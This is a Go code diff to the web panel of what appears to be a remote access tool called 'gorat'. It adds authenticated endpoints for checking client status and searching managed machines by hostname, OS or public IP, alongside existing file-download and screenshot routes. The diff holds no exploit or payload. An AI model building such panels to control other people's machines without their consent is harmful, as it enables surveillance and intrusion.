@@ -9,6 +9,7 @@ import (
 	"log"
 	"net/http"
 	"path/filepath"
+	"strings"
 	"time"
 
 	"gorat/pkg/auth"
@@ -242,17 +243,8 @@ func (wh *WebHandler) HandleLogout(w http.ResponseWriter, r *http.Request) {
 
 // HandleDashboard serves the dashboard page
 func (wh *WebHandler) HandleDashboard(w http.ResponseWriter, r *http.Request) {
-	if wh.templates == nil {
-		w.Header().Set("Content-Type", "text/html")
-		w.WriteHeader(http.StatusOK)
-		w.Write([]byte(`<!DOCTYPE html><html><head><title>Dashboard</title></head><body><h1>Dashboard</h1><p>Templates not available. Please use API endpoints.</p></body></html>`))
-		return
-	}
-
-	if err := wh.templates.ExecuteTemplate(w, "dashboard.html", nil); err != nil {
-		log.Printf("Error rendering dashboard template: %v", err)
-		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-	}
+	// Old dashboard deprecated: redirect to enhanced dashboard
+	http.Redirect(w, r, "/dashboard-new", http.StatusSeeOther)
 }
 
 // HandleTerminalPage serves the terminal page
@@ -390,6 +382,128 @@ func (wh *WebHandler) HandleClientsAPI(w http.ResponseWriter, r *http.Request) {
 
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(metadata)
+}
+
+// HandleClientUpdatesAPI returns current metadata for specified client IDs
+func (wh *WebHandler) HandleClientUpdatesAPI(w http.ResponseWriter, r *http.Request) {
+	// Auth check
+	cookie, err := r.Cookie("session_id")
+	if err != nil || wh.sessionMgr == nil {
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
+		return
+	}
+	if _, exists := wh.sessionMgr.GetSession(cookie.Value); !exists {
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
+		return
+	}
+
+	// Parse body: {"ids": ["id1", "id2", ...]}
+	var req struct {
+		IDs []string `json:"ids"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "Invalid request", http.StatusBadRequest)
+		return
+	}
+	if len(req.IDs) == 0 {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{"clients": []interface{}{}, "missing": []string{}})
+		return
+	}
+
+	// Build response for requested IDs only
+	clientsResp := make([]*protocol.ClientMetadata, 0, len(req.IDs))
+	missing := make([]string, 0)
+
+	for _, id := range req.IDs {
+		client, exists := wh.clientMgr.GetClient(id)
+		if !exists || client == nil {
+			missing = append(missing, id)
+			continue
+		}
+		meta := client.Metadata()
+		if meta == nil {
+			// Minimal payload with unknown status
+			clientsResp = append(clientsResp, &protocol.ClientMetadata{ID: id, Status: "unknown"})
+			continue
+		}
+		// Provide minimal fields useful for status change detection
+		clientsResp = append(clientsResp, &protocol.ClientMetadata{
+			ID:            meta.ID,
+			Hostname:      meta.Hostname,
+			Alias:         meta.Alias,
+			OS:            meta.OS,
+			Arch:          meta.Arch,
+			Status:        meta.Status,
+			PublicIP:      meta.PublicIP,
+			LastSeen:      meta.LastSeen,
+			LastHeartbeat: meta.LastHeartbeat,
+		})
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"clients": clientsResp,
+		"missing": missing,
+	})
+}
+
+// HandleClientSearchAPI returns clients matching a query string (id/hostname/alias/os/ip)
+func (wh *WebHandler) HandleClientSearchAPI(w http.ResponseWriter, r *http.Request) {
+	// Auth check
+	cookie, err := r.Cookie("session_id")
+	if err != nil || wh.sessionMgr == nil {
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
+		return
+	}
+	if _, exists := wh.sessionMgr.GetSession(cookie.Value); !exists {
+		w.WriteHeader(http.StatusUnauthorized)
+		json.NewEncoder(w).Encode(map[string]string{"error": "Unauthorized"})
+		return
+	}
+
+	q := r.URL.Query().Get("q")
+	if q == "" {
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode([]interface{}{})
+		return
+	}
+
+	// Case-insensitive contains
+	qLower := strings.ToLower(q)
+	all := wh.clientMgr.GetAllClients()
+	res := make([]*protocol.ClientMetadata, 0)
+	for _, c := range all {
+		meta := c.Metadata()
+		if meta == nil {
+			continue
+		}
+		// Check fields for match
+		if strings.Contains(strings.ToLower(meta.ID), qLower) ||
+			strings.Contains(strings.ToLower(meta.Hostname), qLower) ||
+			strings.Contains(strings.ToLower(meta.Alias), qLower) ||
+			strings.Contains(strings.ToLower(meta.OS), qLower) ||
+			strings.Contains(strings.ToLower(meta.IP), qLower) ||
+			strings.Contains(strings.ToLower(meta.PublicIP), qLower) {
+			// Return minimal metadata to reduce payload
+			res = append(res, &protocol.ClientMetadata{
+				ID:       meta.ID,
+				Hostname: meta.Hostname,
+				Alias:    meta.Alias,
+				OS:       meta.OS,
+				Arch:     meta.Arch,
+				Status:   meta.Status,
+				PublicIP: meta.PublicIP,
+				LastSeen: meta.LastSeen,
+			})
+		}
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(res)
 }
 
 // HandleFileBrowse handles file browsing requests
@@ -750,6 +864,10 @@ func (wh *WebHandler) RegisterWebRoutes(mux *http.ServeMux) {
 	mux.HandleFunc("/api/files/download", wh.requireAuth(wh.HandleFileDownload))
 	mux.HandleFunc("/api/screenshot", wh.requireAuth(wh.HandleScreenshotRequest))
 	mux.HandleFunc("/api/update/global", wh.requireAuth(wh.HandleGlobalUpdate))
+
+	// Clients UI optimization endpoints
+	mux.HandleFunc("/api/clients/update", wh.requireAuth(wh.HandleClientUpdatesAPI))
+	mux.HandleFunc("/api/clients/search", wh.requireAuth(wh.HandleClientSearchAPI))
 }
 
 // HandleUsersAPI handles GET (list users) and POST (create user) requests
@@ -986,6 +1104,10 @@ func (wh *WebHandler) RegisterGinRoutes(router *gin.Engine) {
 	router.POST("/api/files/download", wh.ginRequireAuth(wh.ginHandleFileDownload))
 	router.GET("/api/screenshot", wh.ginRequireAuth(wh.ginHandleScreenshotRequest))
 	router.POST("/api/update/global", wh.ginRequireAuth(wh.ginHandleGlobalUpdate))
+
+	// Clients UI optimization endpoints
+	router.POST("/api/clients/update", wh.ginRequireAuth(wh.ginHandleClientUpdatesAPI))
+	router.GET("/api/clients/search", wh.ginRequireAuth(wh.ginHandleClientSearchAPI))
 }
 
 // ginRequireAuth is Gin middleware for authentication
@@ -1152,4 +1274,20 @@ func (wh *WebHandler) ginHandleClientsAPI(c *gin.Context) {
 		return
 	}
 	wh.HandleClientsAPI(c.Writer, c.Request)
+}
+
+func (wh *WebHandler) ginHandleClientUpdatesAPI(c *gin.Context) {
+	if wh == nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
+		return
+	}
+	wh.HandleClientUpdatesAPI(c.Writer, c.Request)
+}
+
+func (wh *WebHandler) ginHandleClientSearchAPI(c *gin.Context) {
+	if wh == nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "handler not initialized"})
+		return
+	}
+	wh.HandleClientSearchAPI(c.Writer, c.Request)
 }
